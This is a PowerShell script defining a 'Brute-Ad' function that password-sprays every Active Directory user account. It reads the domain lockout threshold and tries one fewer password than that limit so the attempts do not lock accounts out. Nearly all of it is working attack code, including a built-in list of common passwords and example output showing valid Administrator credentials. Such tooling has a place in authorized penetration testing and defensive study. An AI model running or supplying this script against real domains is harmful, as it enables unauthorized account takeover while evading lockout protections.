﻿<#
.Synopsis
    Brute-forces active directory user accounts based on the password lockout threshold
.DESCRIPTION
	Brute-forces active directory user accounts based on the password lockout threshold
.EXAMPLE
    PS C:\> Brute-Ad
    Bruteforce all accounts in AD with the builtinn list of passwords.
.EXAMPLE
	Brute-Ad -list password1,password2,'$password$','$Pa55w0rd$'
	Bruteforce all accounts in AD with a provided list of passwords.
.EXAMPLE
	Brute-Ad -List password1
    Bruteforce all accounts in AD with just one password.
.EXAMPLE
    Brute-Ad -list Password1,password2,'$password$','$Pa55w0rd$',password12345
    The provided list will be used:  Password1 password2 $password$ $Pa55w0rd$ password12345


    Username        Password   IsValid
    --------        --------   -------
    {Administrator} $Pa55w0rd$ True   
    {jdoe}          Password1  True
#>
function Brute-Ad
{
[cmdletbinding()]
Param
(
		[string[]]$list
)
    if ($list)
        {
        $allpasswords = $list
        Write-Host -ForegroundColor Yellow 'The provided list will be used: '$allpasswords`n
        }
        else
        {
        $allpasswords = @('Password1','password','Password2015','Pa55w0rd','password123','Pa55w0rd1234')
        Write-Host -ForegroundColor Yellow 'The built-in list will be used: '$allpasswords`n
        }

	Function Get-LockOutThreshold  
	{
		$domain = [ADSI]"WinNT://$env:userdomain"
		$Name = @{Name='DomainName';Expression={$_.Name}}
		$AcctLockoutThreshold = @{Name='Account Lockout Threshold (Invalid logon attempts)';Expression={$_.MaxBadPasswordsAllowed}}
		$domain | Select-Object $AcctLockoutThreshold
	}

	$lockout = Get-LockOutThreshold

	Function Test-ADCredential
	{
		Param($username, $password, $domain)
		Add-Type -AssemblyName System.DirectoryServices.AccountManagement
		$ct = [System.DirectoryServices.AccountManagement.ContextType]::Domain
		$pc = New-Object System.DirectoryServices.AccountManagement.PrincipalContext($ct, $domain)
		$object = New-Object PSObject | Select-Object -Property Username, Password, IsValid
		$object.Username = $username;
		$object.Password = $password;
		$object.IsValid = $pc.ValidateCredentials($username, $password).ToString();
		return $object
	}

	$domain = $env:USERDOMAIN
	$username = ''

	$lockoutthres =  $lockout.'Account Lockout Threshold (Invalid logon attempts)'

	if (!$lockoutthres)
	{
	    $passwords = $allpasswords #no lockout threshold
	}
	elseif ($lockoutthres -eq 1)
	{
	    $passwords = $allpasswords | Select-Object -First 1
	}
	else
	{
	    $passwords = $allpasswords | Select-Object -First ($lockoutthres -=1)
	}

	$DirSearcher = New-Object System.DirectoryServices.DirectorySearcher([adsi]'')
    $DirSearcher.Filter = '(&(objectCategory=Person)(objectClass=User))'
	$DirSearcher.FindAll().GetEnumerator() | ForEach-Object{ 

	    $username = $_.Properties.samaccountname
	    foreach ($password in $passwords) 
	    {
	    	$result = Test-ADCredential $username $password 
	    	$result | Where {$_.IsValid -eq $True}
	    }
	}
}